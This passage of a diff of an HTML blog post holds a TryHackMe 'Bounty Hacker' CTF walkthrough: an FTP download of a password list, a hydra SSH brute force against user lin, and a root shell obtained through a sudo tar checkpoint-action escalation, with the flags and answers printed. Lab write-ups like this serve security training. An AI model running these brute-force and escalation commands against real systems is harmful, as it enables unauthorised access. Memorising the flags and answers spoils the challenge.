-</span></span><span style=display:flex><span><span style=color:#ae81ff>226</span> Directory send OK.
+</span></span><span style=display:flex><span>200 EPRT command successful. Consider using EPSV.
+</span></span><span style=display:flex><span>150 Here comes the directory listing.
+</span></span><span style=display:flex><span>-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+</span></span><span style=display:flex><span>-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+</span></span><span style=display:flex><span>226 Directory send OK.
 </span></span><span style=display:flex><span>ftp&gt; get task.txt
 </span></span><span style=display:flex><span>local: task.txt remote: task.txt
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span> EPRT command successful. Consider using EPSV.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> task.txt <span style=color:#f92672>(</span><span style=color:#ae81ff>68</span> bytes<span style=color:#f92672>)</span>.
-</span></span><span style=display:flex><span>100% |*******************************************|    <span style=color:#ae81ff>68</span>      299.12 KiB/s    00:00 ETA
-</span></span><span style=display:flex><span><span style=color:#ae81ff>226</span> Transfer complete.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>68</span> bytes received in 00:00 <span style=color:#f92672>(</span>0.20 KiB/s<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>200 EPRT command successful. Consider using EPSV.
+</span></span><span style=display:flex><span>150 Opening BINARY mode data connection for task.txt (68 bytes).
+</span></span><span style=display:flex><span>100% |*******************************************|    68      299.12 KiB/s    00:00 ETA
+</span></span><span style=display:flex><span>226 Transfer complete.
+</span></span><span style=display:flex><span>68 bytes received in 00:00 (0.20 KiB/s)
 </span></span><span style=display:flex><span>ftp&gt; 
 </span></span><span style=display:flex><span>ftp&gt; get locks.txt
 </span></span><span style=display:flex><span>local: locks.txt remote: locks.txt
-</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span> EPRT command successful. Consider using EPSV.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> locks.txt <span style=color:#f92672>(</span><span style=color:#ae81ff>418</span> bytes<span style=color:#f92672>)</span>.
-</span></span><span style=display:flex><span>100% |*******************************************|   <span style=color:#ae81ff>418</span>        8.17 KiB/s    00:00 ETA
-</span></span><span style=display:flex><span><span style=color:#ae81ff>226</span> Transfer complete.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>418</span> bytes received in 00:00 <span style=color:#f92672>(</span>1.08 KiB/s<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>200 EPRT command successful. Consider using EPSV.
+</span></span><span style=display:flex><span>150 Opening BINARY mode data connection for locks.txt (418 bytes).
+</span></span><span style=display:flex><span>100% |*******************************************|   418        8.17 KiB/s    00:00 ETA
+</span></span><span style=display:flex><span>226 Transfer complete.
+</span></span><span style=display:flex><span>418 bytes received in 00:00 (1.08 KiB/s)
 </span></span><span style=display:flex><span>ftp&gt; bye
-</span></span><span style=display:flex><span><span style=color:#ae81ff>221</span> Goodbye
+</span></span><span style=display:flex><span>221 Goodbye
 </span></span></code></pre></div><p>Here it has two files <em><strong>task.txt</strong></em> and <em><strong>locks.txt</strong></em> I get the file on my machine and
 let’s read both of the files to get the answer to who wrote the task list</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tryhackme/bugbounty<span style=color:#f92672>]</span>
 </span></span><span style=display:flex><span>└─$ cat task.txt                 
@@ -159,7 +153,9 @@ let’s read both of the files to get the answer to who wrote the task list</p><
 </span></span><span style=display:flex><span>2.<span style=color:#f92672>)</span> Plan <span style=color:#66d9ef>for</span> Red Eye pickup on the moon.
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>-lin
-</span></span></code></pre></div><p><em><strong>1, Who wrote the task list?</strong></em></p><p><em><strong>ans " lin &ldquo;</strong></em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat locks.txt         
+</span></span></code></pre></div><blockquote>
+<p>1, Who wrote the task list?</p></blockquote><blockquote>
+<p>ans " lin "</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>cat locks.txt         
 </span></span><span style=display:flex><span>rEddrAGON
 </span></span><span style=display:flex><span>ReDdr4g0nSynd!cat3
 </span></span><span style=display:flex><span>Dr@gOn$yn9icat3
@@ -186,65 +182,70 @@ let’s read both of the files to get the answer to who wrote the task list</p><
 </span></span><span style=display:flex><span>rEDdrAGOnSyNDiCat3
 </span></span><span style=display:flex><span>r3ddr@g0N
 </span></span></code></pre></div><p>The locks.txt file has some strings it looks like passwords
-So now we can try brute forcing SSH with hydra taking the username lin and the password list <em><strong>locks.txt</strong></em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> hydra -l lin -P locks.txt 10.10.168.115 ssh
-</span></span><span style=display:flex><span>Hydra v9.2 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2021</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
+So now we can try brute forcing SSH with hydra taking the username lin and the password list <em><strong>locks.txt</strong></em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span> hydra -l lin -P locks.txt 10.10.168.115 ssh
+</span></span><span style=display:flex><span>Hydra v9.2 (c) 2021 by van Hauser/THC <span style=color:#960050;background-color:#1e0010>&amp;</span> David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2022-01-14 23:43:59
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>26</span> login tries <span style=color:#f92672>(</span>l:1/p:26<span style=color:#f92672>)</span>, ~2 tries per task
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://10.10.168.115:22/
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 10.10.168.115   login: lin   password: RedDr4gonSynd1cat3
-</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Writing restore file because <span style=color:#ae81ff>2</span> final worker threads did not complete <span style=color:#66d9ef>until</span> end.
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> <span style=color:#ae81ff>2</span> targets did not resolve or could not be connected
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> <span style=color:#ae81ff>0</span> target did not complete
-</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2022-01-14 23:44:08
+</span></span><span style=display:flex><span>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 23:43:59
+</span></span><span style=display:flex><span>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+</span></span><span style=display:flex><span>[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+</span></span><span style=display:flex><span>[DATA] attacking ssh://10.10.168.115:22/
+</span></span><span style=display:flex><span>[22][ssh] host: 10.10.168.115   login: lin   password: RedDr4gonSynd1cat3
+</span></span><span style=display:flex><span>1 of 1 target successfully completed, 1 valid password found
+</span></span><span style=display:flex><span>[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+</span></span><span style=display:flex><span>[ERROR] 2 targets did not resolve or could not be connected
+</span></span><span style=display:flex><span>[ERROR] 0 target did not complete
+</span></span><span style=display:flex><span>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-14 23:44:08
 </span></span></code></pre></div><p>after successful brute forcing we got the password for user <em><strong>lin</strong></em>
-which is <em><strong>RedDr4gonSynd1cat3</strong></em></p><p>it&rsquo;s time to answer the next questions</p><p><em><strong>2, What service can you brute force with the text file found?</strong></em></p><p><em><strong>&rdquo; SSH &ldquo;</strong></em></p><p><em><strong>3, What is the user&rsquo;s password?</strong></em></p><p><em><strong>&rdquo; RedDr4gonSynd1cat3 &ldquo;</strong></em></p><p><strong>Gaining access</strong></p><p>Now, let’s access the machine through SSH using the recently obtained credentials</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh lin@10.10.168.115                                                         <span style=color:#ae81ff>255</span> ⨯
-</span></span><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;10.10.168.115 (10.10.168.115)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>This key is not known by any other names
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>10.10.168.115<span style=color:#e6db74>&#39; (ED25519) to the list of known hosts.
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>lin@10.10.168.115&#39;</span>s password: 
-</span></span><span style=display:flex><span>Welcome to Ubuntu 16.04.6 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-101-generic x86_64<span style=color:#f92672>)</span>
+which is <em><strong>RedDr4gonSynd1cat3</strong></em></p><p>it&rsquo;s time to answer the next questions</p><blockquote>
+<p>2, What service can you brute force with the text file found?</p></blockquote><blockquote>
+<p>SSH</p></blockquote><blockquote>
+<p>3, What is the user&rsquo;s password?</p></blockquote><blockquote>
+<p>RedDr4gonSynd1cat3</p></blockquote><p><strong>Gaining access</strong></p><p>Now, let’s access the machine through SSH using the recently obtained credentials</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>ssh lin@10.10.168.115                                                         255 ⨯
+</span></span><span style=display:flex><span>The authenticity of host &#39;10.10.168.115 (10.10.168.115)&#39; can&#39;t be established.
+</span></span><span style=display:flex><span>ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
+</span></span><span style=display:flex><span>This key is not known by any other names
+</span></span><span style=display:flex><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span style=display:flex><span>Warning: Permanently added &#39;10.10.168.115&#39; (ED25519) to the list of known hosts.
+</span></span><span style=display:flex><span>lin@10.10.168.115&#39;s password: 
+</span></span><span style=display:flex><span>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
 </span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
 </span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ae81ff>83</span> packages can be updated.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> updates are security updates.
+</span></span><span style=display:flex><span>83 packages can be updated.
+</span></span><span style=display:flex><span>0 updates are security updates.
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Last login: Sun Jun  <span style=color:#ae81ff>7</span> 22:23:41 <span style=color:#ae81ff>2020</span> from 192.168.0.14
+</span></span><span style=display:flex><span>Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
 </span></span><span style=display:flex><span>lin@bountyhacker:~/Desktop$ ls
 </span></span><span style=display:flex><span>user.txt
 </span></span><span style=display:flex><span>lin@bountyhacker:~/Desktop$ cat user.txt
-</span></span><span style=display:flex><span>THM<span style=color:#f92672>{</span>CR1M3_SyNd1C4T3<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>THM{CR1M3_SyNd1C4T3}
 </span></span></code></pre></div><p><em><strong>user.txt THM{CR1M3_SyNd1C4T3}</strong></em></p><p>Now we got the user.txt flag and now we have to find <em><strong>root.txt</strong></em>, for
-that I checked the sudo permissions and found that <strong>tar</strong> I can run as root</p><p><strong>privilege escalation</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>lin@bountyhacker:~/Desktop$ sudo -l
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lin: 
-</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> lin on bountyhacker:
+that I checked the sudo permissions and found that <strong>tar</strong> I can run as root</p><p><strong>Privilege escalation</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>lin@bountyhacker:~/Desktop$ sudo -l
+</span></span><span style=display:flex><span>[sudo] password for lin: 
+</span></span><span style=display:flex><span>Matching Defaults entries for lin on bountyhacker:
 </span></span><span style=display:flex><span>    env_reset, mail_badpass,
-</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+</span></span><span style=display:flex><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>User lin may run the following commands on bountyhacker:
-</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /bin/tar
+</span></span><span style=display:flex><span>    (root) /bin/tar
 </span></span></code></pre></div><p>Check the <a href=https://gtfobins.github.io/>GTFObins</a> for tar Exploit which is a site GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, I got this</p><p><img loading=lazy src=/blog/posts/img/gtfo_bins.png alt="Test Image">
-</p><p>command <strong>&rdquo; sudo tar -cf /dev/null /dev/null &ndash;checkpoint=1 &ndash;checkpoint-action=exec=/bin/sh &ldquo;</strong></p><p>run this command in the target machine shell it is greeted as root</p><p>now we are in root and got the root flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>lin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> --checkpoint-action<span style=color:#f92672>=</span>exec<span style=color:#f92672>=</span>/bin/sh
-</span></span><span style=display:flex><span>tar: Removing leading <span style=color:#e6db74>`</span>/<span style=color:#960050;background-color:#1e0010>&#39;</span> from member names
-</span></span><span style=display:flex><span><span style=color:#75715e># whoami</span>
+</p><blockquote>
+<p>command <strong>" sudo tar -cf /dev/null /dev/null &ndash;checkpoint=1 &ndash;checkpoint-action=exec=/bin/sh &ldquo;</strong></p></blockquote><p>run this command in the target machine shell it is greeted as root</p><p>now we are in root and got the root flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>lin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+</span></span><span style=display:flex><span>tar: Removing leading `/&#39; from member names
+</span></span><span style=display:flex><span># whoami
 </span></span><span style=display:flex><span>root
-</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span># ls
 </span></span><span style=display:flex><span>bin    dev   initrd.img      lib64	 mnt   root  snap  tmp	vmlinuz
 </span></span><span style=display:flex><span>boot   etc   initrd.img.old  lost+found  opt   run   srv   usr	vmlinuz.old
 </span></span><span style=display:flex><span>cdrom  home  lib	     media	 proc  sbin  sys   var
-</span></span><span style=display:flex><span><span style=color:#75715e># cd root</span>
-</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span># cd root
+</span></span><span style=display:flex><span># ls
 </span></span><span style=display:flex><span>root.txt
-</span></span><span style=display:flex><span><span style=color:#75715e># cat root.txt</span>
-</span></span><span style=display:flex><span>THM<span style=color:#f92672>{</span>80UN7Y_h4cK3r<span style=color:#f92672>}</span>
-</span></span><span style=display:flex><span><span style=color:#75715e># Connection to 10.10.168.115 closed by remote host.</span>
+</span></span><span style=display:flex><span># cat root.txt
+</span></span><span style=display:flex><span>THM{80UN7Y_h4cK3r}
+</span></span><span style=display:flex><span># Connection to 10.10.168.115 closed by remote host.
 </span></span><span style=display:flex><span>Connection to 10.10.168.115 closed.
 </span></span></code></pre></div><p>root.txt <em><strong>THM{80UN7Y_h4cK3r}</strong></em></p><p>Thank you for reading
 Happy Hacking</p></div><footer class=post-footer>
